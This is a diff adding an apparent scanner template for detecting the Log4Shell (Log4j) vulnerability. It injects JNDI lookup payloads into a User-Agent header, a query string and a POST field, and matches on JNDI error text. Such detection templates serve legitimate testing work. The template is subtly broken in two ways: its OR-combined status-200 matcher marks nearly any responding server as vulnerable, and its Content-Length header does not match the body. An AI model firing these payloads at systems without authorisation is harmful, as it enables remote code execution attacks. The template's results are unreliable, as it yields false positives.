@@ -1,0 +1,45 @@
+id: log4shell-simple
+
+info:
+  name: Log4Shell RCE Detection
+  author: security-lab
+  severity: critical
+  tags: cve,log4j,rce
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: ${jndi:ldap://127.0.0.1:1389/test}
+
+      - |
+        GET /?test=${jndi:ldap://127.0.0.1:1389/test} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 45
+
+        username=${jndi:ldap://127.0.0.1:1389/test}
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "javax.naming.CommunicationException"
+          - "javax.naming.NamingException"
+          - "Error looking up JNDI resource"
+        part: body
+
+      - type: regex
+        regex:
+          - "javax.naming.CommunicationException"
+          - "javax.naming.NamingException"
+        part: header
+
+      - type: status
+        status:
+          - 200
